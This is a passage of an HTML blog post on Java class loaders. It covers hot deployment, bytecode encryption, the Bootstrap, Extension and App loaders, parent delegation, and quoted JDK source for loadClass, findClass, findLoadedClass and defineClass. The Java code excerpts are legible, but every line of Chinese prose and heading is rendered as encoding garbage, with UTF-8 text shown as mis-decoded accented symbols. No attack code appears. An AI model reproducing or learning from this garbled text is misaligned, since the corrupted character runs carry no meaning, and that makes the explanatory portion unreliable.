title="2„ÄÅÁÉ≠ÈÉ®ÁΩ≤"></a>2„ÄÅÁÉ≠ÈÉ®ÁΩ≤</h3><p>ÂØπ‰∫éJavaÂ∫îÁî®Á®ãÂ∫èÊù•ËØ¥ÔºåÁÉ≠ÈÉ®ÁΩ≤Â∞±ÊòØÂú®ËøêË°åÊó∂Êõ¥Êñ∞JavaÁ±ªÊñá‰ª∂„ÄÇÂú®Âü∫‰∫éJavaÁöÑÂ∫îÁî®ÊúçÂä°Âô®ÂÆûÁé∞ÁÉ≠ÈÉ®ÁΩ≤ÁöÑËøáÁ®ã‰∏≠ÔºåÁ±ªË£ÖÂÖ•Âô®ÊâÆÊºîÁùÄÈáçË¶ÅÁöÑËßíËâ≤„ÄÇÁ±ªË£ÖÂÖ•Âô®‰∏çËÉΩÈáçÊñ∞Ë£ÖÂÖ•‰∏Ä‰∏™Â∑≤ÁªèË£ÖÂÖ•ÁöÑÁ±ªÔºå‰ΩÜÂè™Ë¶Å‰ΩøÁî®‰∏Ä‰∏™Êñ∞ÁöÑÁ±ªË£ÖÂÖ•Âô®ÂÆû‰æãÔºåÂ∞±ÂèØ‰ª•Â∞ÜÁ±ªÂÜçÊ¨°Ë£ÖÂÖ•‰∏Ä‰∏™Ê≠£Âú®ËøêË°åÁöÑÂ∫îÁî®Á®ãÂ∫è„ÄÇËøôÊ†∑Êàë‰ª¨Â∫îÁî®Ê≠£Âú®ËøêË°åÁöÑÊó∂ÂÄôÂçáÁ∫ßËΩØ‰ª∂ÔºåÂç¥‰∏çÈúÄË¶ÅÈáçÊñ∞ÂêØÂä®Â∫îÁî®„ÄÇ</p><h3 id="3„ÄÅ‰ª£Á†Å‰øùÊä§"><a href="#3„ÄÅ‰ª£Á†Å‰øùÊä§" class="headerlink" title="3„ÄÅ‰ª£Á†Å‰øùÊä§"></a>3„ÄÅ‰ª£Á†Å‰øùÊä§</h3><p>Êàë‰ª¨ÂèØ‰ª•ÂØπÂ≠óËäÇÁ†ÅÊñá‰ª∂ËøõË°åÂä†ÂØÜÔºåÁÑ∂ÂêéÂÜç‰ΩøÁî®ÁâπÂÆöÁöÑClassLoaderËß£ÂØÜÊñá‰ª∂ÂÜÖÂÆπÔºåÂÜçÂä†ËΩΩËøô‰∫õÂ≠óËäÇÁ†ÅÊñá‰ª∂„ÄÇËøôÊ†∑Â∞±ËÉΩÂ§üÂÆûÁé∞ÂØπÊàë‰ª¨ÁöÑ‰ª£Á†ÅÈ°πÁõÆÂä†ÂØÜ‰øùÊä§ÔºåÂà´‰∫∫Êó†Ê≥ïËøõË°åÂèçÁºñËØëÊü•ÁúãÊ∫ê‰ª£Á†Å‰ø°ÊÅØ„ÄÇ</p><h2 id="0x04-Á±ªÂä†ËΩΩÂô®ÂàÜÁ±ª"><a href="#0x04-Á±ªÂä†ËΩΩÂô®ÂàÜÁ±ª" class="headerlink" title="0x04 Á±ªÂä†ËΩΩÂô®ÂàÜÁ±ª"></a>0x04 Á±ªÂä†ËΩΩÂô®ÂàÜÁ±ª</h2><p>Âú®ÁÆÄÂçï‰∫ÜËß£ÁöÑÁ±ªÂä†ËΩΩÂô®ÁöÑÊ¶ÇÂøµ‰ΩúÁî®‰πãÂêéÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÁúãjava‰∏≠Á±ªÂä†ËΩΩÂô®ÁöÑÂàÜÁ±ª„ÄÇÁ±ªÂä†ËΩΩÂô®Â§ßËá¥ÂàÜ‰∏∫‰∏§ÁßçÔºå‰∏ÄÁßçÊòØJVMËá™Â∏¶ÁöÑÁ±ªÂä†ËΩΩÂô®ÔºåÂàÜÂà´‰∏∫ÂºïÂØºÁ±ªÂä†ËΩΩÂô®„ÄÅÊâ©Â±ïÁ±ªÂä†ËΩΩÂô®ÂíåÁ≥ªÁªüÁ±ªÂä†ËΩΩÂô®„ÄÇÂè¶Â§ñ‰∏ÄÁßçÂ∞±ÊòØÁî®Êà∑Ëá™ÂÆö‰πâÁöÑÁ±ªÂä†ËΩΩÂô®ÔºåÂèØ‰ª•ÈÄöËøáÁªßÊâøjava.lang.ClassLoaderÁ±ªÁöÑÊñπÂºèÂÆûÁé∞Ëá™Â∑±ÁöÑÁ±ªÂä†ËΩΩÂô®„ÄÇ</p><h3 id="4-1-JVMÈªòËÆ§Á±ªÂä†ËΩΩÂô®"><a href="#4-1-JVMÈªòËÆ§Á±ªÂä†ËΩΩÂô®" class="headerlink" title="4.1 JVMÈªòËÆ§Á±ªÂä†ËΩΩÂô®"></a>4.1 JVMÈªòËÆ§Á±ªÂä†ËΩΩÂô®</h3><h4 id="4-1-1-ÂºïÂØºÁ±ªÂä†ËΩΩÂô®-BootstrapClassLoader"><a href="#4-1-1-ÂºïÂØºÁ±ªÂä†ËΩΩÂô®-BootstrapClassLoader" class="headerlink" title="4.1.1 ÂºïÂØºÁ±ªÂä†ËΩΩÂô®(BootstrapClassLoader)"></a>4.1.1 ÂºïÂØºÁ±ªÂä†ËΩΩÂô®(BootstrapClassLoader)</h4><p>ÂºïÂØºÁ±ªÂä†ËΩΩÂô®(BootstrapClassLoader)ÔºåÂ∫ïÂ±ÇÂéüÁîü‰ª£Á†ÅÊòØC++ËØ≠Ë®ÄÁºñÂÜôÔºåÂ±û‰∫éjvm‰∏ÄÈÉ®ÂàÜÔºå‰∏çÁªßÊâøjava.lang.ClassLoaderÁ±ªÔºå‰πüÊ≤°ÊúâÁà∂Âä†ËΩΩÂô®Ôºå‰∏ªË¶ÅË¥üË¥£Âä†ËΩΩÊ†∏ÂøÉjavaÂ∫ì(Âç≥JVMÊú¨Ë∫´)ÔºåÂ≠òÂÇ®Âú®&#x2F;jre&#x2F;lib&#x2F;rt.jarÁõÆÂΩïÂΩì‰∏≠„ÄÇ(ÂêåÊó∂Â§Ñ‰∫éÂÆâÂÖ®ËÄÉËôëÔºåBootstrapClassLoaderÂè™Âä†ËΩΩÂåÖÂêç‰∏∫java„ÄÅjavax„ÄÅsunÁ≠âÂºÄÂ§¥ÁöÑÁ±ª)„ÄÇ</p><p>ËøôÈáå‰ª•ÊàëÁöÑÁîµËÑë‰∏≠jdk1.7‰∏∫‰æãÔºåËøôÈáåÊàë‰ª¨ÁúãÂà∞&#x2F;jre&#x2F;lib&#x2F;rt.jarÁõÆÂΩïÔºåËøôÈáåÈù¢ÁöÑÁ±ªÈÉΩÊòØÁî±BootstrapClassLoaderÊù•Âä†ËΩΩ„ÄÇ</p><p><img src="2.png" loading="lazy"></p><p>‰πãÂêéÊàë‰ª¨‰ΩøÁî®ObjectÁ±ª‰∏∫‰æãÔºåÁúãÁúãÂÖ∂ÊòØÂê¶Â≠òÂú®Áà∂Âä†ËΩΩÂô®„ÄÇÂõ†‰∏∫ObjectÁ±ªÊòØÊâÄÊúâÂ≠êÁ±ªÁöÑÁà∂Á±ªÔºåÂΩíÂ±û‰∫éBootstrapClassLoader„ÄÇÂèëÁé∞Âπ∂Ê≤°ÊúâÁà∂Á±ªÂä†ËΩΩÂô®ÔºåÁªìÊûú‰∏∫null„ÄÇ</p><p><img src="3.png" loading="lazy"></p><h4 id="4-1-2-Êâ©Â±ïÁ±ªÂä†ËΩΩÂô®-ExtensionsClassLoader"><a href="#4-1-2-Êâ©Â±ïÁ±ªÂä†ËΩΩÂô®-ExtensionsClassLoader" class="headerlink" title="4.1.2 Êâ©Â±ïÁ±ªÂä†ËΩΩÂô®(ExtensionsClassLoader)"></a>4.1.2 Êâ©Â±ïÁ±ªÂä†ËΩΩÂô®(ExtensionsClassLoader)</h4><p>Êâ©Â±ïÁ±ªÂä†ËΩΩÂô®(ExtensionsClassLoader)ÔºåÁî±sun.misc.Launcher$ExtClassLoaderÁ±ªÂÆûÁé∞ÔºåÁî®Êù•Âú®&#x2F;jre&#x2F;lib&#x2F;extÊàñËÄÖjava.ext.dirs‰∏≠ÊåáÊòéÁöÑÁõÆÂΩïÂä†ËΩΩjavaÁöÑÊâ©Â±ïÂ∫ì„ÄÇJavaËôöÊãüÊú∫‰ºöÊèê‰æõ‰∏Ä‰∏™Êâ©Â±ïÂ∫ìÁõÆÂΩïÔºåÊ≠§Âä†ËΩΩÂô®Âú®ÁõÆÂΩïÈáåÈù¢Êü•ÊâæÂπ∂Âä†ËΩΩjavaÁ±ª„ÄÇ</p><p>‰ª•ÊàëÁöÑÁîµËÑë‰∏∫‰æãÔºåËøô‰∏™ÁõÆÂΩï‰∏ãÁöÑjarÂåÖÈÉΩÊòØÁî±ExtensionsClassLoaderËøõË°åÂä†ËΩΩ„ÄÇ</p><p><img src="4.png" loading="lazy"></p><p>ËøôÈáåÊàë‰ª¨ÂèØ‰ª•ÈÄâÊã©‰∏Ä‰∏™zipfs.jarÂåÖÔºåÁÑ∂ÂêéÊü•Áúã‰∏ãÂÖ∂jar‰∏≠ÁöÑZipPathÁ±ªÂä†ËΩΩÂô®ÔºåÂèëÁé∞Â≠òÂú®‰∫éExtensionsClassLoader„ÄÇ</p><p><img src="5.png" loading="lazy"></p><h4 id="4-1-3-AppÁ±ªÂä†ËΩΩÂô®-Á≥ªÁªüÁ±ªÂä†ËΩΩÂô®ÔºàAppClassLoaderÔºâ"><a href="#4-1-3-AppÁ±ªÂä†ËΩΩÂô®-Á≥ªÁªüÁ±ªÂä†ËΩΩÂô®ÔºàAppClassLoaderÔºâ" class="headerlink" title="4.1.3 AppÁ±ªÂä†ËΩΩÂô®&#x2F;Á≥ªÁªüÁ±ªÂä†ËΩΩÂô®ÔºàAppClassLoaderÔºâ"></a>4.1.3 AppÁ±ªÂä†ËΩΩÂô®&#x2F;Á≥ªÁªüÁ±ªÂä†ËΩΩÂô®ÔºàAppClassLoaderÔºâ</h4><p>AppÁ±ªÂä†ËΩΩÂô®&#x2F;Á≥ªÁªüÁ±ªÂä†ËΩΩÂô®ÔºàAppClassLoaderÔºâÔºåÁî±sun.misc.Launcher$AppClassLoaderÂÆûÁé∞Ôºå‰∏ÄËà¨ÈÄöËøáÈÄöËøá(java.class.pathÊàñËÄÖClasspathÁéØÂ¢ÉÂèòÈáè)Êù•Âä†ËΩΩJavaÁ±ªÔºå‰πüÂ∞±ÊòØÊàë‰ª¨Â∏∏ËØ¥ÁöÑclasspathË∑ØÂæÑ„ÄÇÈÄöÂ∏∏Êàë‰ª¨ÊòØ‰ΩøÁî®Ëøô‰∏™Âä†ËΩΩÁ±ªÊù•Âä†ËΩΩJavaÂ∫îÁî®Á±ªÔºåÂèØ‰ª•‰ΩøÁî®ClassLoader.getSystemClassLoader()Êù•Ëé∑ÂèñÂÆÉ„ÄÇ</p><p>ËøôÈáåÊàë‰ª¨‰ΩøÁî®Êú¨Ë∫´ÂÜôÁöÑClassLoaderTestÁ±ªËøõË°åÊµãËØïÔºåÂèëÁé∞Â≠òÂú®‰∫éAppClassLoader„ÄÇ</p><p><img src="6.png" loading="lazy"></p><h4 id="4-2-Ëá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®-UserDefineClassLoader"><a href="#4-2-Ëá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®-UserDefineClassLoader" class="headerlink" title="4.2 Ëá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®(UserDefineClassLoader)"></a>4.2 Ëá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®(UserDefineClassLoader)</h4><p>Ëá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®(UserDefineClassLoader)ÔºåÈô§‰∫Ü‰∏äËø∞javaËá™Â∏¶Êèê‰æõÁöÑÁ±ªÂä†ËΩΩÂô®ÔºåÊàë‰ª¨ËøòÂèØ‰ª•ÈÄöËøáÁªßÊâøjava.lang.ClassLoaderÁ±ªÁöÑÊñπÂºèÂÆûÁé∞Ëá™Â∑±ÁöÑÁ±ªÂä†ËΩΩÂô®„ÄÇÂÖ∑‰ΩìÂÆûÁé∞ÊñπÊ≥ïÊàë‰ª¨Á≠â‰∏ãÂçïÁã¨ËÆ≤Ëß£„ÄÇ</p><h2 id="0x05-Âèå‰∫≤ÂßîÊ¥æÊú∫Âà∂"><a href="#0x05-Âèå‰∫≤ÂßîÊ¥æÊú∫Âà∂" class="headerlink" title="0x05 Âèå‰∫≤ÂßîÊ¥æÊú∫Âà∂"></a>0x05 Âèå‰∫≤ÂßîÊ¥æÊú∫Âà∂</h2><p>ÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•‰ΩøÁî®JVMÈªòËÆ§‰∏âÁßçÁ±ªÂä†ËΩΩÂô®ËøõË°åÁõ∏‰∫íÈÖçÂêà‰ΩøÁî®Ôºå‰∏îÊòØÊåâÈúÄÂä†ËΩΩÊñπÂºèÔºåÂ∞±ÊòØÊàë‰ª¨ÈúÄË¶Å‰ΩøÁî®ËØ•Á±ªÁöÑÊó∂ÂÄôÔºåÊâç‰ºöÂ∞ÜÁîüÊàêÁöÑclassÊñá‰ª∂Âä†ËΩΩÂà∞ÂÜÖÂ≠òÂΩì‰∏≠ÁîüÊàêclassÂØπË±°ËøõË°å‰ΩøÁî®Ôºå‰∏îÂä†ËΩΩËøáÁ®ã‰ΩøÁî®ÁöÑÊòØÂèå‰∫≤ÂßîÊ¥æÊ®°ÂºèÔºåÂèäÊääÈúÄË¶ÅÂä†ËΩΩÁöÑÁ±ª‰∫§Áî±Áà∂Âä†ËΩΩÂô®ËøõË°åÂ§ÑÁêÜ„ÄÇ</p><p>Ê¶ÇÂøµÊúâÁÇπÁªïÔºåÊàë‰ª¨ÂèØ‰ª•ÂÖàÁúãÁ±ªÂä†ËΩΩÂô®ÂßîÊ¥æÂÖ≥Á≥ª</p><p><img src="7.png" loading="lazy"></p><p>Â¶Ç‰∏äÂõæÁ±ªÂä†ËΩΩÂô®Â±ÇÊ¨°ÂÖ≥Á≥ªÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ÜÂÖ∂Áß∞‰∏∫Á±ªÂä†ËΩΩÂô®ÁöÑÂèå‰∫≤ÂßîÊ¥æÊ®°Âûã„ÄÇ‰ΩÜÊ≥®ÊÑèÁöÑÊòØÔºå‰ªñ‰ª¨‰πãÈó¥Âπ∂‰∏çÊòØ‚ÄùÁªßÊâø‚Äù‰ΩìÁ≥ªÔºåËÄåÊòØÂßîÊ¥æ‰ΩìÁ≥ª„ÄÇÂΩì‰∏äËø∞ÁâπÂÆöÁöÑÁ±ªÂä†ËΩΩÂô®Êé•Âà∞Âä†ËΩΩÁ±ªÁöÑËØ∑Ê±ÇÊó∂ÔºåÈ¶ñÂÖà‰ºöÂÖàÂ∞Ü‰ªªÂä°ÂßîÊâòÁªôÁà∂Á±ªÂä†ËΩΩÂô®ÔºåÊé•ÁùÄËØ∑Ê±ÇÁà∂Á±ªÂä†ËΩΩËøô‰∏™Á±ªÔºåÂΩìÁà∂Á±ªÂä†ËΩΩÂô®Êó†Ê≥ïÂä†ËΩΩÊó∂ÔºàÂÖ∂ÁõÆÂΩïÊêúÁ¥†ËåÉÂõ¥Ê≤°ÊúâÊâæÂà∞ÊâÄÈúÄË¶ÅÁöÑÁ±ªÊó∂ÔºâÔºåÂ≠êÁ±ªÂä†ËΩΩÂô®Êâç‰ºöËøõË°åÂä†ËΩΩ‰ΩøÁî®„ÄÇËøôÊ†∑ÂèØ‰ª•ÈÅøÂÖçÊúâ‰∫õÁ±ªË¢´ÈáçÂ§çÂä†ËΩΩ„ÄÇ</p><h3 id="5-1-Âèå‰∫≤ÂßîÊ¥æÂ•ΩÂ§Ñ"><a href="#5-1-Âèå‰∫≤ÂßîÊ¥æÂ•ΩÂ§Ñ" class="headerlink" title="5.1 Âèå‰∫≤ÂßîÊ¥æÂ•ΩÂ§Ñ"></a>5.1 Âèå‰∫≤ÂßîÊ¥æÂ•ΩÂ§Ñ</h3><p>1„ÄÅËøôÊ†∑Â∞±ÊòØËÉΩÂ§üÂÆûÁé∞Êúâ‰∫õÁ±ªÈÅøÂÖçÈáçÂ§çÂä†ËΩΩ‰ΩøÁî®ÔºåÁõ¥Êé•ÂÖàÁªôÁà∂Âä†ËΩΩÂô®Âä†ËΩΩÔºå‰∏çÁî®Â≠êÂä†ËΩΩÂô®ÂÜçÊ¨°ÈáçÂ§çÂä†ËΩΩ„ÄÇ</p><p>2„ÄÅ‰øùËØÅjavaÊ†∏ÂøÉÂ∫ìÁöÑÁ±ªÂûãÂÆâÂÖ®„ÄÇÊØîÂ¶ÇÁΩëÁªú‰∏ä‰º†Ëæì‰∫Ü‰∏Ä‰∏™java.lang.ObjectÁ±ªÔºåÈÄöËøáÂèå‰∫≤Ê®°Âºè‰º†ÈÄíÂà∞ÂêØÂä®Á±ªÂΩì‰∏≠ÔºåÁÑ∂ÂêéÂèëÁé∞ÂÖ∂ObjectÁ±ªÊó©Â∑≤Ë¢´Âä†ËΩΩËøáÔºåÊâÄ‰ª•Â∞±‰∏ç‰ºöÂä†ËΩΩËøô‰∏™ÁΩëÁªú‰º†ËæìËøáÊù•ÁöÑjava.lang.ObjectÁ±ªÔºå‰øùËØÅÊàë‰ª¨ÁöÑjavaÊ†∏ÂøÉAPIÂ∫ì‰∏çË¢´ÁØ°ÊîπÔºåÂá∫Áé∞Á±ª‰ººÁî®Êà∑Ëá™ÂÆö‰πâjava.lang.ObjectÁ±ªÁöÑÊÉÖÂÜµ„ÄÇ</p><p>ÂÅáËÆæÊàë‰ª¨ÂàõÂª∫‰∏Ä‰∏™java.langÂåÖÔºåËá™ÂÆö‰πâ‰∏Ä‰∏™TestObjectÁ±ªÔºå‰ΩÜÁî±‰∫éÂèå‰∫≤ÂßîÊ¥æÊú∫Âà∂ÁöÑÂ≠òÂú®ÔºåÊòØ‰∏çÂÖÅËÆ∏Âä†ËΩΩËøêË°åÁöÑ„ÄÇ</p><p><img src="8.png" loading="lazy"></p><h2 id="CLassLoaderÁ±ªÊ†∏ÂøÉÊñπÊ≥ï"><a href="#CLassLoaderÁ±ªÊ†∏ÂøÉÊñπÊ≥ï" class="headerlink" title="CLassLoaderÁ±ªÊ†∏ÂøÉÊñπÊ≥ï"></a>CLassLoaderÁ±ªÊ†∏ÂøÉÊñπÊ≥ï</h2><p>Èô§‰∫Ü‰∏äËø∞BootstrapClassLoaderÔºåÂÖ∂‰ªñÁ±ªÂä†ËΩΩÂô®ÈÉΩÊòØÁªßÊâø‰∫ÜCLassLoaderÁ±ªÔºåÊàë‰ª¨Â∞±‰∏ÄËµ∑ÁúãÁúãÂÖ∂Á±ªÁöÑÊ†∏ÂøÉÊñπÊ≥ï„ÄÇ‰ª•‰∏ã‰ª£Á†ÅÈÉΩÊòØÊà™Âèñ‰∫ÜÂÖ∂ÊñπÊ≥ïÁöÑÊ∫êÁ†Å„ÄÇ</p><h3 id="1„ÄÅloadClassÔºöÂä†ËΩΩÊåáÂÆöÁöÑjavaÁ±ª"><a href="#1„ÄÅloadClassÔºöÂä†ËΩΩÊåáÂÆöÁöÑjavaÁ±ª" class="headerlink" title="1„ÄÅloadClassÔºöÂä†ËΩΩÊåáÂÆöÁöÑjavaÁ±ª"></a>1„ÄÅloadClassÔºöÂä†ËΩΩÊåáÂÆöÁöÑjavaÁ±ª</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span>        <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token function">getClassLoadingLock</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// First, check if the class has already been loaded</span>            <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">long</span> t0 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        c <span class="token operator">=</span> <span class="token function">findBootstrapClassOrNull</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// ClassNotFoundException thrown if class not found</span>                    <span class="token comment">// from the non-null parent class loader</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">// If still not found, then invoke findClass in order</span>                    <span class="token comment">// to find the class.</span>                    <span class="token keyword">long</span> t1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    c <span class="token operator">=</span> <span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// this is the defining class loader; record the stats</span>                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getParentDelegationTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addTime</span><span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getFindClassTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addElapsedTimeFrom</span><span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>PerfCounter</span><span class="token punctuation">.</span><span class="token function">getFindClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">increment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">resolveClass</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span></code></pre><p>Âú®loadClassÊñπÊ≥ï‰∏≠ÔºåÂÆÉÂÖà‰ΩøÁî®‰∫ÜfindLoadedClass(String)ÊñπÊ≥ïÊù•Ê£ÄÊü•Ëøô‰∏™Á±ªÊòØÂê¶Ë¢´Âä†ËΩΩËøá„ÄÇ</p><p>Êé•ÁùÄ‰ΩøÁî®Áà∂Âä†ËΩΩÂô®Ë∞ÉÁî®loadClassÔºàStringÔºâÊñπÊ≥ïÔºåÂ¶ÇÊûúÁà∂Âä†ËΩΩÂô®‰∏∫nullÔºåÁ±ªÂä†ËΩΩÂô®Âä†ËΩΩjvmÂÜÖÁΩÆÁöÑÂä†ËΩΩÂô®„ÄÇ</p><p>‰πãÂêéÂ∞±Ë∞ÉÁî®findClass(String) ÊñπÊ≥ïË£ÖËΩΩÁ±ª„ÄÇ</p><p>ÊúÄÂêéÈÄöËøá‰∏äËø∞Ê≠•È™§Êàë‰ª¨ÊâæÂà∞‰∫ÜÂØπÂ∫îÁöÑÁ±ªÔºåÂπ∂‰∏îÊé•Êî∂Âà∞ÁöÑresolveÂèÇÊï∞ÁöÑÂÄº‰∏∫true,ÈÇ£‰πàÂ∞±‰ºöË∞ÉÁî®resolveClass(Class)ÊñπÊ≥ïÊù•Â§ÑÁêÜÁ±ª„ÄÇ</p><h3 id="2„ÄÅfindCLassÔºöÊü•ÊâæÊåáÂÆöÁöÑJavaÁ±ª"><a href="#2„ÄÅfindCLassÔºöÊü•ÊâæÊåáÂÆöÁöÑJavaÁ±ª" class="headerlink" title="2„ÄÅfindCLassÔºöÊü•ÊâæÊåáÂÆöÁöÑJavaÁ±ª"></a>2„ÄÅfindCLassÔºöÊü•ÊâæÊåáÂÆöÁöÑJavaÁ±ª</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">findClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><h3 id="3„ÄÅfindLoadedClassÔºöÊü•ÊâæJVMÂ∑≤ÁªèÂä†ËΩΩËøáÁöÑÁ±ª"><a href="#3„ÄÅfindLoadedClassÔºöÊü•ÊâæJVMÂ∑≤ÁªèÂä†ËΩΩËøáÁöÑÁ±ª" class="headerlink" title="3„ÄÅfindLoadedClassÔºöÊü•ÊâæJVMÂ∑≤ÁªèÂä†ËΩΩËøáÁöÑÁ±ª"></a>3„ÄÅfindLoadedClassÔºöÊü•ÊâæJVMÂ∑≤ÁªèÂä†ËΩΩËøáÁöÑÁ±ª</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">checkName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">findLoadedClass0</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><h3 id="4„ÄÅdefineClassÔºöÂÆö‰πâ‰∏Ä‰∏™JavaÁ±ªÔºåÂ∞ÜÂ≠óËäÇÁ†ÅËß£ÊûêÊàêËôöÊãüÊú∫ËØÜÂà´ÁöÑClassÂØπË±°„ÄÇÂæÄÂæÄÂíåfindClass-ÊñπÊ≥ïÈÖçÂêà‰ΩøÁî®„ÄÇ"><a href="#4„ÄÅdefineClassÔºöÂÆö‰πâ‰∏Ä‰∏™JavaÁ±ªÔºåÂ∞ÜÂ≠óËäÇÁ†ÅËß£ÊûêÊàêËôöÊãüÊú∫ËØÜÂà´ÁöÑClassÂØπË±°„ÄÇÂæÄÂæÄÂíåfindClass-ÊñπÊ≥ïÈÖçÂêà‰ΩøÁî®„ÄÇ" class="headerlink" title="4„ÄÅdefineClassÔºöÂÆö‰πâ‰∏Ä‰∏™JavaÁ±ªÔºåÂ∞ÜÂ≠óËäÇÁ†ÅËß£ÊûêÊàêËôöÊãüÊú∫ËØÜÂà´ÁöÑClassÂØπË±°„ÄÇÂæÄÂæÄÂíåfindClass()ÊñπÊ≥ïÈÖçÂêà‰ΩøÁî®„ÄÇ"></a>4„ÄÅdefineClassÔºöÂÆö‰πâ‰∏Ä‰∏™JavaÁ±ªÔºåÂ∞ÜÂ≠óËäÇÁ†ÅËß£ÊûêÊàêËôöÊãüÊú∫ËØÜÂà´ÁöÑClassÂØπË±°„ÄÇÂæÄÂæÄÂíåfindClass()ÊñπÊ≥ïÈÖçÂêà‰ΩøÁî®„ÄÇ</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> off<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span>        <span class="token keyword">throws</span> <span class="token class-name">ClassFormatError</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token 